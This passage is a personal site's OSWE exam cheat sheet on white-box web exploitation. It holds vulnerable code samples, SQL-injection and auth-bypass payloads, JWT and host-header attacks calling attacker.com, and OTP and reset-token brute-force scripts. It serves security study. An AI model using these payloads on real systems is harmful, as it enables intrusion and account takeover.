@@ -1,0 +1,2021 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>OSWE | Notes v2</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="./img/oswe_icon.svg" rel="icon">
+  <link href="./img/oswe_icon.svg" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
+    rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="./vendor/aos/aos.css" rel="stylesheet">
+  <link href="./vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="./vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <!-- Prism CSS -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+
+  <!-- Template Main CSS File -->
+  <link href="./css/style.css" rel="stylesheet">
+
+  <!-- Open Graph meta tags -->
+  <meta property="og:title" content="OSWE Notes v2">
+  <meta property="og:description" content="Clean OSWE cheatsheet - source code review, web app exploitation, and white-box techniques.">
+  <meta property="og:image" content="./img/favicon.png">
+  <meta property="og:url" content="./oswe_new.html">
+  <meta property="og:type" content="website">
+
+  <!-- Twitter Card meta tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="OSWE Notes v2">
+  <meta name="twitter:description" content="Clean OSWE cheatsheet - source code review, web app exploitation, and white-box techniques.">
+  <meta name="twitter:image" content="./img/favicon.png">
+  <style>
+  /* Index sidebar color flow (bell curve, orange hue ~30) */
+  .section-flow-1{background-color:#fdf5ef;}
+  .section-flow-1 .dropdown-container{background-color:#fdf5ef;}
+  .section-flow-2{background-color:#fbe3cc;}
+  .section-flow-2 .dropdown-container{background-color:#fbe3cc;}
+  .section-flow-3{background-color:#f7c99a;}
+  .section-flow-3 .dropdown-container{background-color:#f7c99a;}
+  .section-flow-4{background-color:#f3af6a;}
+  .section-flow-4 .dropdown-container{background-color:#f3af6a;}
+  .section-flow-5{background-color:#ef9b44;}
+  .section-flow-5 .dropdown-container{background-color:#ef9b44;}
+  .section-flow-6{background-color:#eb8a28;}
+  .section-flow-6 .dropdown-container{background-color:#eb8a28;}
+  .section-flow-7{background-color:#eb8a28;}
+  .section-flow-7 .dropdown-container{background-color:#eb8a28;}
+  .section-flow-8{background-color:#ef9b44;}
+  .section-flow-8 .dropdown-container{background-color:#ef9b44;}
+  .section-flow-9{background-color:#f3af6a;}
+  .section-flow-9 .dropdown-container{background-color:#f3af6a;}
+  .section-flow-10{background-color:#f7c99a;}
+  .section-flow-10 .dropdown-container{background-color:#f7c99a;}
+  .section-flow-11{background-color:#fbe3cc;}
+  .section-flow-11 .dropdown-container{background-color:#fbe3cc;}
+  .section-flow-12{background-color:#fdf5ef;}
+  .section-flow-12 .dropdown-container{background-color:#fdf5ef;}
+  </style>
+</head>
+
+<body>
+
+  <!-- ======= Mobile nav toggle button ======= -->
+  <button type="button" class="menu-trigger" onclick="toggleMenu()" aria-label="Toggle menu" aria-expanded="false"><i class="bi bi-list"></i><i class="bi bi-x-lg"></i></button>
+  <div class="menu-backdrop" onclick="closeMenu()" aria-hidden="true"></div>
+
+  <!-- ======= Header ======= -->
+  <!-- ======= Top Bar (brand strip; always visible) ======= -->
+  <div id="topbar">
+    <div class="topbar-social">
+      <a href="https://www.linkedin.com/in/wencheng-xue5aa52631b/" target="_blank" rel="noopener noreferrer" class="linkedin" aria-label="LinkedIn"><i class="bi bi-linkedin"></i></a>
+      <div class="topbar-email-wrap">
+        <button type="button" class="topbar-email" onclick="toggleTopbarEmail(event)" aria-label="Email" aria-haspopup="dialog" aria-expanded="false"><i class="bi bi-envelope-fill"></i></button>
+        <div id="topbar-email-popup" class="topbar-email-popup" role="dialog" aria-label="Contact email">
+          <span class="topbar-email-text">xuewencheng156@gmail.com</span>
+          <button type="button" class="topbar-email-copy" onclick="copyTopbarEmail(event)" title="Copy"><i class="bi bi-clipboard"></i></button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <header id="header">
+    <div class="d-flex flex-column">
+
+      <div class="profile">
+        <h1 class="text-light"><a href="index.html">Wencheng Xue</a></h1>
+        <div class="social-links mt-3 text-center">
+          <a href="https://www.linkedin.com/in/wencheng-xue5aa52631b/" target="_blank" class="linkedin"><i class="bi bi-linkedin"></i></a>
+          <div class="sidebar-email-wrap">
+            <button type="button" class="sidebar-email" onclick="toggleSidebarEmail(event)" aria-label="Email" aria-haspopup="dialog" aria-expanded="false"><i class="bi bi-envelope-fill"></i></button>
+            <div id="sidebar-email-popup" class="sidebar-email-popup" role="dialog" aria-label="Contact email">
+              <span class="sidebar-email-text">xuewencheng156@gmail.com</span>
+              <button type="button" class="sidebar-email-copy" onclick="copySidebarEmail(event)" title="Copy"><i class="bi bi-clipboard"></i></button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <nav id="navbar" class="nav-menu navbar">
+        <ul>
+          <li><a href="./index.html" class="nav-link scrollto"><i class="bi bi-house navicon"></i>Home</a></li>
+          <li class="dropdown">
+            <a href="./oscp.html" class="nav-link scrollto" onclick="toggleSubmenu(event)"><i
+                class="bi bi-laptop navicon"></i>Notes <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
+            <ul id="submenu" class="submenu">
+              <li><a href="./oscp.html" class="nav-link scrollto"><img src="./img/oscp_icon.png" alt="OSCP Icon" class="nav-icon-img">OSCP</a></li>
+              <li><a href="./osep.html" class="nav-link scrollto"><img src="./img/osep_icon.png" alt="OSEP Icon" class="nav-icon-img">OSEP</a></li>
+              <li><a href="./oswe.html" class="nav-link scrollto"><img src="./img/oswe_icon.svg" alt="OSWE Icon" class="nav-icon-img">OSWE</a></li>
+              <li><a href="./osed.html" class="nav-link scrollto"><img src="./img/osed_icon.svg" alt="OSED Icon" class="nav-icon-img">OSED</a></li>
+              <li><a href="#" class="nav-link scrollto nav-disabled" onclick="return false;"><img src="./img/osai_icon.svg" alt="OSAI Icon" class="nav-icon-img">OSAI <span class="coming-soon-badge">Coming Soon</span></a></li>
+              <li><a href="./crto.html" class="nav-link scrollto"><img src="./img/crto_icon.png" alt="CRTO Icon" class="nav-icon-img">CRTO</a></li>
+              <li><a href="./crtl.html" class="nav-link scrollto"><img src="./img/crtl_icon.png" alt="CRTL Icon" class="nav-icon-img">CRTL</a></li>
+            </ul>
+          </li>
+          <li class="dropdown">
+            <a href="./oscp_new.html" class="nav-link scrollto active" onclick="toggleSubmenu(event)"><i
+                class="bi bi-journal-text navicon"></i>Notesv2 <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
+            <ul id="submenu2" class="submenu open">
+              <li><a href="./oscp_new.html" class="nav-link scrollto"><img src="./img/oscp_icon.png" alt="OSCP Icon" class="nav-icon-img">OSCP</a></li>
+              <li><a href="./osep_new.html" class="nav-link scrollto"><img src="./img/osep_icon.png" alt="OSEP Icon" class="nav-icon-img">OSEP</a></li>
+              <li><a href="./oswe_new.html" class="nav-link scrollto active"><img src="./img/oswe_icon.svg" alt="OSWE Icon" class="nav-icon-img">OSWE</a></li>
+              <li><a href="./osed_new.html" class="nav-link scrollto"><img src="./img/osed_icon.svg" alt="OSED Icon" class="nav-icon-img">OSED</a></li>
+            </ul>
+          </li>
+          <li><a href="./portfolio.html" class="nav-link scrollto"><i class="bi bi-folder-fill navicon"></i><span>Portfolio</span></a></li>
+          <li class="dropdown">
+            <a href="./projects.html" class="nav-link scrollto" onclick="toggleSubmenu(event)"><i
+                class="bi bi-code-square navicon"></i>Projects <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
+            <ul class="submenu">
+              <li><a href="./sliver-c2-evasion-suite.html" class="nav-link scrollto"><i class="bi bi-shield-shaded" style="font-size: 18px; vertical-align: middle; margin-right: 6px; color: #6f42c1;"></i>Sliver C2 Evasion Suite</a></li>
+            </ul>
+          </li>
+        </ul>
+      </nav><!-- .nav-menu -->
+    </div>
+  </header><!-- End Header -->
+
+  <main id="main">
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>OSWE Notes v2</h2>
+          <p class="text-muted small">Latest update: June, 2026</p>
+          <ol>
+            <li><a href="index.html">Home</a></li>
+            <li>OSWE Notes v2</li>
+          </ol>
+        </div>
+
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Cheatsheet Section ======= -->
+    <section id="cheatsheet" class="cheatsheet">
+      <div class="container">
+
+        <div class="row gy-4">
+          <div class="col-lg-12">
+            <div class="cheatsheet-content">
+
+              <!-- ============================================================ -->
+              <!-- Section 1: Source Code Review                                -->
+              <!-- ============================================================ -->
+              <h2 id="source-code-review">1. Source Code Review</h2>
+              <p>White-box review starts by mapping every route that accepts user input, then tracing that input through the codebase to dangerous sinks. Any tainted data reaching a sink without proper sanitization is exploitable.</p>
+
+              <h3 id="scr-grep-patterns">1.1 Grep Patterns for Sinks &amp; Sources</h3>
+              <p>Search for dangerous functions first, then trace backward to find which user-controlled inputs reach them.</p>
+              <pre><code class="language-bash"># ---- PHP sinks ----
+grep -rn "eval\|system\|exec\|passthru\|shell_exec\|popen\|proc_open" src/
+grep -rn "unserialize\|include\|require\|file_get_contents\|file_put_contents" src/
+grep -rn "mysqli_query\|PDO-&gt;query\|pg_query\|mysql_query" src/
+
+# ---- PHP sources ----
+grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE\|\$_SERVER\[.HTTP_" src/
+
+# ---- Python sinks ----
+grep -rn "os\.system\|subprocess\.\|eval(\|exec(\|render_template_string" .
+grep -rn "pickle\.loads\|yaml\.load\b\|yaml\.unsafe_load" .
+grep -rn "\.execute(.*%\|\.execute(.*format\|\.execute(.*f\"\|\.raw(" .
+
+# ---- Java sinks ----
+grep -rn "Runtime\.exec\|ProcessBuilder\|ScriptEngine\|Expression" src/
+grep -rn "ObjectInputStream\|readObject\|XMLDecoder" src/
+grep -rn "createQuery.*+\|nativeQuery.*+\|Statement.*execute.*+" src/
+
+# ---- Node.js sinks ----
+grep -rn "eval(\|Function(\|child_process\|execSync\|spawn" .
+grep -rn "deserialize\|node-serialize\|vm\.runInNewContext" .
+grep -rn "__proto__\|\[.constructor.\]\|\[.prototype.\]" .
+
+# ---- C# / .NET sinks ----
+grep -rn "BinaryFormatter\|NetDataContract\|LosFormatter\|XmlSerializer" src/
+grep -rn "Process\.Start\|cmd\.exe\|PowerShell" src/
+grep -rn "SqlCommand\|ExecuteReader\|ExecuteNonQuery\|FromSqlRaw" src/</code></pre>
+
+              <h3 id="scr-static-analysis">1.2 Static Analysis Tools</h3>
+              <table class="custom-table">
+                <thead><tr><th>Tool</th><th>Languages</th><th>Usage</th></tr></thead>
+                <tbody>
+                  <tr><td>Semgrep</td><td>PHP, Python, Java, JS, C#, Go, Ruby</td><td><code>semgrep --config auto src/</code></td></tr>
+                  <tr><td>CodeQL</td><td>Java, C#, Python, JS, C/C++, Go, Ruby</td><td>Write QL queries for custom taint tracking</td></tr>
+                  <tr><td>Snyk Code</td><td>Multi-language</td><td>IDE plugin with real-time taint analysis</td></tr>
+                  <tr><td>PHPStan / Psalm</td><td>PHP</td><td>Type-level analysis, catches unsafe sinks</td></tr>
+                  <tr><td>Bandit</td><td>Python</td><td><code>bandit -r src/</code></td></tr>
+                  <tr><td>SpotBugs + FindSecBugs</td><td>Java</td><td>Bytecode-level security analysis</td></tr>
+                  <tr><td>ESLint + security plugins</td><td>JavaScript</td><td><code>eslint --ext .js src/</code></td></tr>
+                </tbody>
+              </table>
+              <pre><code class="language-bash"># Quick Semgrep security scan by language
+semgrep --config p/php-security src/
+semgrep --config p/python-security src/
+semgrep --config p/java-security src/
+semgrep --config p/nodejs-security src/
+semgrep --config p/csharp-security src/</code></pre>
+
+              <h3 id="scr-vuln-patterns">1.3 Common Vulnerability Patterns</h3>
+              <table class="custom-table">
+                <thead><tr><th>Pattern</th><th>What to Look For</th></tr></thead>
+                <tbody>
+                  <tr><td>String-concatenated SQL</td><td><code>"SELECT * FROM users WHERE id=" + id</code> instead of parameterized queries</td></tr>
+                  <tr><td>Unescaped template output</td><td><code>${var}</code> or <code>&lt;%= var %&gt;</code> without encoding in HTML context</td></tr>
+                  <tr><td>Unsafe deserialization</td><td><code>unserialize()</code>, <code>readObject()</code>, <code>pickle.loads()</code> on user input</td></tr>
+                  <tr><td>Direct file operations</td><td><code>include($_GET['page'])</code>, <code>open(user_input)</code> without path validation</td></tr>
+                  <tr><td>Eval-like constructs</td><td><code>eval()</code>, <code>exec()</code>, <code>Function()</code>, template string execution</td></tr>
+                  <tr><td>Missing auth checks</td><td>Routes without middleware, <code>@login_required</code> absent, no session validation</td></tr>
+                  <tr><td>TOCTOU race conditions</td><td>Check-then-use with file operations or permission validation</td></tr>
+                  <tr><td>Mass assignment</td><td>Binding all request params to model: <code>User.create(req.body)</code></td></tr>
+                </tbody>
+              </table>
+
+              <h3 id="scr-routing">1.4 HTTP Routing Patterns</h3>
+              <p>Map every endpoint before looking at sinks. Each framework expresses routes differently.</p>
+              <table class="custom-table">
+                <thead><tr><th>Framework</th><th>Route Pattern</th></tr></thead>
+                <tbody>
+                  <tr><td>Flask / FastAPI (Python)</td><td><code>@app.route("/path", methods=[...])</code> / <code>@app.get(...)</code></td></tr>
+                  <tr><td>Django (Python)</td><td><code>urls.py</code> - <code>path()</code>, <code>re_path()</code></td></tr>
+                  <tr><td>Express (Node.js)</td><td><code>app.get/post/put/delete("/path", handler)</code> / <code>router.use(...)</code></td></tr>
+                  <tr><td>Spring (Java)</td><td><code>@RequestMapping</code>, <code>@GetMapping</code>, <code>@PostMapping</code></td></tr>
+                  <tr><td>JAX-RS / Servlet (Java)</td><td><code>@Path</code> annotations; <code>web.xml</code> <code>&lt;servlet-mapping&gt;</code></td></tr>
+                  <tr><td>ASP.NET MVC / Core</td><td><code>[Route("...")]</code>, <code>[HttpGet/Post]</code> attributes; <code>MapRoute</code></td></tr>
+                  <tr><td>Laravel (PHP)</td><td><code>routes/web.php</code> / <code>routes/api.php</code> - <code>Route::get/post(...)</code></td></tr>
+                  <tr><td>Symfony (PHP)</td><td><code>@Route("/path")</code> annotations or <code>routes.yaml</code></td></tr>
+                  <tr><td>Frappe / ERPNext</td><td><code>@frappe.whitelist()</code> decorator</td></tr>
+                  <tr><td>Ruby on Rails</td><td><code>config/routes.rb</code> - <code>get '/path', to: 'controller#action'</code></td></tr>
+                </tbody>
+              </table>
+              <pre><code class="language-bash"># Enumerate routes from source
+# Flask
+grep -rn "@app\.route\|@blueprint\.route\|@app\.get\|@app\.post" .
+
+# Express
+grep -rn "app\.get\|app\.post\|app\.put\|app\.delete\|router\.\(get\|post\|put\|delete\)" .
+
+# Spring
+grep -rn "@RequestMapping\|@GetMapping\|@PostMapping\|@PutMapping\|@DeleteMapping" .
+
+# Laravel
+grep -rn "Route::\(get\|post\|put\|delete\|any\|match\)" routes/
+
+# Django
+grep -rn "path(\|re_path(\|url(" */urls.py
+
+# ASP.NET
+grep -rn "\[HttpGet\]\|\[HttpPost\]\|\[Route(\|MapRoute\|MapGet\|MapPost" .</code></pre>
+
+              <h3 id="scr-taint-tracking">1.5 Manual Taint Tracking</h3>
+              <p>For each sink found via grep, trace backward: which function calls it, what parameter carries attacker data, and what sanitization (if any) runs in between.</p>
+              <pre><code class="language-bash"># Find parameters flowing into queries (PHP)
+grep -rn "query\s*=\s*.*\$_\(GET\|POST\|REQUEST\)" src/
+
+# Find unescaped user output (PHP XSS)
+grep -rn "echo\s.*\$_\(GET\|POST\)" src/
+
+# Find format-string SQL (Python)
+grep -rn "execute.*%s\|execute.*format\|execute.*f\"" .
+
+# Find unsafe template rendering (Python)
+grep -rn "render_template_string\|Template(" .
+
+# Find request.getParameter flowing into sinks (Java)
+grep -rn "getParameter\|getHeader\|getCookies" src/ | head -50
+
+# Semgrep automated taint tracking
+semgrep --config p/owasp-top-ten src/</code></pre>
+
+              <h3 id="scr-debugger-setup">1.6 Remote Debugger Setup</h3>
+              <p>Step through the live app at the sink to confirm exactly what value arrives and what filtering runs along the way.</p>
+              <pre><code class="language-bash"># PHP + Xdebug -&gt; VS Code
+# In php.ini:
+#   zend_extension=xdebug
+#   xdebug.mode=debug
+#   xdebug.client_host=&lt;your_ip&gt;
+#   xdebug.start_with_request=yes
+# VS Code: install "PHP Debug" extension, "Listen for Xdebug" config
+
+# Node.js -&gt; Chrome DevTools / VS Code
+node --inspect-brk=0.0.0.0:9229 server.js
+# Chrome: chrome://inspect -&gt; configure target -&gt; inspect
+
+# Java (Tomcat / SpringBoot) -&gt; IntelliJ remote debug
+JAVA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005"
+# IntelliJ: Run -&gt; Edit Configurations -&gt; Remote JVM Debug -&gt; port 5005
+
+# Python (Flask) -&gt; debugpy / VS Code
+python3 -m debugpy --listen 0.0.0.0:5678 --wait-for-client app.py
+
+# .NET -&gt; VS Code / Visual Studio
+# Set ASPNETCORE_ENVIRONMENT=Development
+# Attach to running process via dotnet-dump or VS debugger</code></pre>
+
+              <h3 id="scr-language-tips">1.7 Language-Specific Tips</h3>
+              <p><strong>PHP:</strong> Watch for <code>==</code> vs <code>===</code> (type juggling), <code>extract()</code> overwriting variables, <code>$$var</code> variable variables, <code>preg_replace</code> with <code>/e</code> modifier (code execution), and <code>assert()</code> evaluating strings.</p>
+              <pre><code class="language-php">// Dangerous PHP patterns
+extract($_POST);           // overwrites any variable in scope
+$$key = $value;            // variable variable - attacker controls var name
+preg_replace('/.*/e', $input, '');  // /e = eval replacement (PHP &lt; 7)
+assert($userInput);        // evaluates string as PHP code
+create_function('', $code); // equivalent to eval</code></pre>
+              <p><strong>Java:</strong> Check for Expression Language (EL) injection, unsafe reflection, JNDI lookups with user input (<code>lookup(userInput)</code>), and XML parsers without DTD disabled.</p>
+              <pre><code class="language-java">// Dangerous Java patterns
+Runtime.getRuntime().exec(userInput);
+new ProcessBuilder(userInput).start();
+new ObjectInputStream(socket.getInputStream()).readObject();
+ctx.lookup("ldap://" + userInput);  // JNDI injection
+engine.eval(userInput);             // ScriptEngine eval</code></pre>
+              <p><strong>Node.js:</strong> Watch for prototype pollution via <code>merge()</code>/<code>extend()</code>, <code>vm</code> module sandbox escapes, <code>child_process</code> with unsanitized input, and <code>require()</code> with user-controlled paths.</p>
+              <pre><code class="language-javascript">// Dangerous Node.js patterns
+eval(userInput);
+child_process.exec('cmd ' + userInput);
+require(userInput);                       // arbitrary module load
+vm.runInNewContext(userInput);             // sandbox escape possible
+_.merge(target, JSON.parse(userInput));   // prototype pollution</code></pre>
+              <p><strong>Python:</strong> Watch for <code>eval()</code>/<code>exec()</code>, <code>pickle.loads()</code> on untrusted data, <code>yaml.load()</code> without <code>Loader=SafeLoader</code>, format string injection via <code>.format(**locals())</code>, and <code>subprocess.call(shell=True)</code>.</p>
+              <pre><code class="language-python"># Dangerous Python patterns
+eval(user_input)
+exec(user_input)
+pickle.loads(base64.b64decode(cookie))
+yaml.load(user_data)                        # use yaml.safe_load()
+subprocess.call(f"echo {user_input}", shell=True)
+render_template_string(user_input)           # SSTI</code></pre>
+              <p><strong>C#:</strong> Watch for <code>BinaryFormatter.Deserialize()</code>, <code>Process.Start()</code>, raw SQL via <code>SqlCommand</code> string concat, <code>XmlDocument</code> with DTD processing enabled, and <code>ViewState</code> without MAC validation.</p>
+              <pre><code class="language-csharp">// Dangerous C# patterns
+new BinaryFormatter().Deserialize(stream);
+Process.Start("cmd.exe", "/c " + userInput);
+new SqlCommand("SELECT * FROM users WHERE id=" + id, conn);
+XmlDocument doc = new XmlDocument();
+doc.XmlResolver = new XmlUrlResolver();  // allows XXE
+doc.LoadXml(userInput);</code></pre>
+
+              <!-- ============================================================ -->
+              <!-- Section 2: Authentication Bypass                             -->
+              <!-- ============================================================ -->
+              <h2 id="auth-bypass">2. Authentication Bypass</h2>
+              <p>Auth bypass targets the login, registration, and password-reset flows. In white-box exams you can read the exact comparison logic and craft precise payloads.</p>
+
+              <h3 id="auth-sqli-bypass">2.1 SQL Injection Auth Bypass</h3>
+              <p>When a login query is string-concatenated, inject a comment that makes the WHERE clause always true or terminates the password check.</p>
+              <pre><code class="language-sql">-- Classic bypass payloads
+username: admin'--
+username: admin'#               -- MySQL comment
+username: ' OR '1'='1
+username: ' OR 1=1--
+password: ' OR 1=1--
+
+-- Second-user injection
+username: validuser'/*
+password: */OR'1'='1
+
+-- Bypass hash comparison (SQLi in password field)
+password: ' OR password LIKE '%
+
+-- Specific to different quote styles
+username: admin"--              -- if query uses double quotes
+username: admin\                -- escape the closing quote</code></pre>
+
+              <h3 id="auth-logic-flaws">2.2 Logic Flaws</h3>
+              <p>Look for flawed conditional checks, missing return statements after redirects, and incorrect operator precedence in auth guards.</p>
+              <pre><code class="language-php">// Missing return after redirect - code continues executing
+if (!$authenticated) {
+    header("Location: /login");
+    // missing: exit; or return;
+}
+// This code still runs for unauthenticated users
+$secret_data = get_admin_panel();
+
+// Incorrect boolean logic
+if ($role != "admin" || $role != "moderator") {  // always true!
+    deny();  // should use &amp;&amp; not ||
+}
+
+// IDOR in role check (checking parameter instead of session)
+$role = $_GET['role'];    // attacker supplies role=admin
+if ($role === 'admin') {
+    show_admin_panel();
+}
+
+// Default allow pattern
+$allowed = true;
+foreach ($rules as $rule) {
+    if ($rule-&gt;matches($request)) {
+        $allowed = $rule-&gt;isAllowed();  // only updates if a rule matches
+    }
+}
+// If no rule matches, $allowed stays true</code></pre>
+              <pre><code class="language-python"># Flask: decorator order matters
+@app.route('/admin')
+# @login_required  &lt;-- missing decorator = unauthenticated access
+def admin_panel():
+    return render_template('admin.html')
+
+# Django: missing LoginRequiredMixin on class-based view
+class AdminView(TemplateView):  # should include LoginRequiredMixin
+    template_name = 'admin.html'
+
+# Express: middleware not applied to specific route
+app.get('/admin', adminController.panel);  // no auth middleware
+// Should be: app.get('/admin', authMiddleware, adminController.panel);</code></pre>
+
+              <h3 id="auth-type-juggling">2.2 Type Juggling (PHP)</h3>
+              <p>PHP loose comparison (<code>==</code>) treats strings starting with <code>0e</code> followed by digits as float zero, making different hashes "equal."</p>
+              <table class="custom-table">
+                <thead><tr><th>Input</th><th>MD5 Hash</th><th>Loose Compare</th></tr></thead>
+                <tbody>
+                  <tr><td><code>240610708</code></td><td><code>0e462097431906509019562988736854</code></td><td>== 0 (true)</td></tr>
+                  <tr><td><code>QNKCDZO</code></td><td><code>0e830400451993494058024219903391</code></td><td>== 0 (true)</td></tr>
+                  <tr><td><code>aabg7XSs</code></td><td><code>0e087386482136013740957780965295</code></td><td>== 0 (true)</td></tr>
+                </tbody>
+              </table>
+              <pre><code class="language-php">// Vulnerable code
+if (md5($password) == $stored_hash) { /* login */ }
+// If stored hash starts with "0e..." and attacker submits "240610708"
+// md5("240610708") = "0e462..." == "0e..." evaluates to 0 == 0 = TRUE
+
+// JSON type juggling: send integer where string expected
+// POST: {"username": 0, "password": "anything"}
+// PHP: 0 == "admin" is TRUE with loose comparison
+
+// Fix: use === or password_verify()
+if (password_verify($password, $stored_hash)) { /* safe */ }</code></pre>
+
+              <h3 id="auth-jwt">2.3 JWT Attacks</h3>
+              <p>Decode every JWT header to find the algorithm, then test algorithm confusion, none signature, and weak secrets.</p>
+              <pre><code class="language-bash"># Decode without verification
+jwt_tool "eyJ..." -d
+
+# Algorithm confusion: RS256 -&gt; HS256, sign with public key as HMAC secret
+jwt_tool "eyJ..." -X a -pk public.pem
+
+# "alg: none" attack - strip signature
+jwt_tool "eyJ..." -X n
+
+# Brute-force weak HS256 secret
+jwt_tool "eyJ..." -C -d /usr/share/wordlists/rockyou.txt
+
+# Forge token with tampered claims
+jwt_tool "eyJ..." -T -S hs256 -p "discovered_secret"
+
+# JWKS injection: host your own key and point jku/x5u to it
+jwt_tool "eyJ..." -X s -ju "http://attacker.com/jwks.json"</code></pre>
+              <table class="custom-table">
+                <thead><tr><th>Attack</th><th>Condition</th></tr></thead>
+                <tbody>
+                  <tr><td>alg: none</td><td>Server accepts unsigned tokens</td></tr>
+                  <tr><td>RS256 to HS256</td><td>Server uses public key for both; sign with pubkey as HMAC</td></tr>
+                  <tr><td>Weak secret</td><td>HS256 with dictionary-crackable key</td></tr>
+                  <tr><td>JKU/X5U injection</td><td>Server fetches key from attacker-controlled URL</td></tr>
+                  <tr><td>kid injection</td><td><code>kid</code> param used in file path or SQL query</td></tr>
+                </tbody>
+              </table>
+
+              <h3 id="auth-session-fixation">2.4 Session Fixation</h3>
+              <p>If the app does not regenerate the session ID after login, an attacker who sets a known session cookie before authentication can hijack the session post-login.</p>
+              <pre><code class="language-bash"># 1. Attacker obtains a valid session ID
+curl -v http://target/login
+# Set-Cookie: PHPSESSID=attacker_controlled_value
+
+# 2. Trick victim into using that session ID (via XSS, meta tag, subdomain cookie)
+# &lt;script&gt;document.cookie="PHPSESSID=attacker_controlled_value"&lt;/script&gt;
+
+# 3. Victim logs in - session ID stays the same
+# 4. Attacker uses the known session ID to access the authenticated session
+curl -b "PHPSESSID=attacker_controlled_value" http://target/dashboard</code></pre>
+
+              <h3 id="auth-password-reset">2.5 Password Reset Flaws</h3>
+              <p>Reset flows are prime pre-auth targets: predictable tokens, host-header injection, and parameter pollution.</p>
+              <pre><code class="language-python"># Predictable token (timestamp-seeded PRNG)
+import random, time, requests
+TARGET = "http://target/reset"
+now = int(time.time())
+for seed in range(now - 10, now + 10):
+    random.seed(seed)
+    token = "".join(random.choice("0123456789abcdef") for _ in range(32))
+    r = requests.get(f"{TARGET}?token={token}", allow_redirects=False)
+    if r.status_code == 200:
+        print(f"[+] Valid token: {token}")
+        break</code></pre>
+              <pre><code class="language-bash"># Host header injection: reset link points to attacker server
+curl -X POST http://target/forgot-password \
+  -H "Host: attacker.com" \
+  -d "email=victim@corp.com"
+# Victim clicks link: http://attacker.com/reset?token=SECRET
+
+# HTTP parameter pollution: two email params
+curl -X POST http://target/forgot-password \
+  -d "email=victim@corp.com&amp;email=attacker@evil.com"
+# Some frameworks: first for DB lookup, second for mail delivery</code></pre>
+
+              <h3 id="auth-mfa-bypass">2.6 MFA Bypass</h3>
+              <p>Common bypasses: skip the MFA step by directly requesting the post-MFA endpoint, reuse OTP codes that are not invalidated, brute-force short OTP codes without rate limiting, or exploit race conditions with concurrent requests.</p>
+              <pre><code class="language-bash"># Direct access to post-MFA page (missing server-side check)
+curl -b "session=authenticated_cookie" http://target/dashboard
+
+# OTP brute-force (4-digit code, no rate limiting)
+for i in $(seq 0000 9999); do
+  code=$(printf "%04d" $i)
+  resp=$(curl -s -o /dev/null -w "%{http_code}" \
+    -b "session=sess_cookie" \
+    -d "otp=$code" http://target/verify-mfa)
+  if [ "$resp" != "403" ]; then
+    echo "[+] Valid OTP: $code"
+    break
+  fi
+done</code></pre>
+
+              <h3 id="auth-oauth">2.7 OAuth Misconfigurations</h3>
+              <table class="custom-table">
+                <thead><tr><th>Flaw</th><th>Exploit</th></tr></thead>
+                <tbody>
+                  <tr><td>Open redirect in redirect_uri</td><td>Steal auth code via <code>redirect_uri=https://attacker.com</code></td></tr>
+                  <tr><td>Missing state parameter</td><td>CSRF to link attacker's OAuth account to victim</td></tr>
+                  <tr><td>Token in URL fragment</td><td>Referer header leaks token to third-party resources</td></tr>
+                  <tr><td>Insecure token storage</td><td>Token stored in localStorage accessible via XSS</td></tr>
+                  <tr><td>Scope escalation</td><td>Modify scope param: <code>scope=openid+profile+admin</code></td></tr>
+                </tbody>
+              </table>
+
+              <!-- ============================================================ -->
+              <!-- Section 3: SQL Injection                                     -->
+              <!-- ============================================================ -->
+              <h2 id="sql-injection">3. SQL Injection</h2>
+              <p>SQL injection remains the most common web vulnerability. In white-box review, locate every raw SQL query that concatenates user input instead of using parameterized queries.</p>
+
+              <h3 id="sqli-union">3.1 UNION-Based SQLi</h3>
+              <p>UNION injection appends a second SELECT to the original query. You need the correct column count and compatible data types.</p>
+              <pre><code class="language-sql">-- Step 1: Find column count
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+' ORDER BY 5-- -     -- increase until error
+
+-- Step 2: Find displayable columns
+' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT 'a',NULL,NULL,NULL,NULL-- -
+
+-- Step 3: Extract data
+' UNION SELECT username,password,NULL,NULL,NULL FROM users-- -
+' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables-- -
+' UNION SELECT column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -</code></pre>
+
+              <h3 id="sqli-error">3.2 Error-Based SQLi</h3>
+              <pre><code class="language-sql">-- MySQL: extractvalue / updatexml
+' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))-- -
+' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)-- -
+
+-- PostgreSQL: cast error
+' AND 1=CAST((SELECT version()) AS int)-- -
+
+-- MSSQL: convert error
+' AND 1=CONVERT(int, (SELECT @@version))-- -
+' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysdatabases))-- -</code></pre>
+
+              <h3 id="sqli-blind">3.3 Blind SQLi</h3>
+              <pre><code class="language-sql">-- Boolean-based
+' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
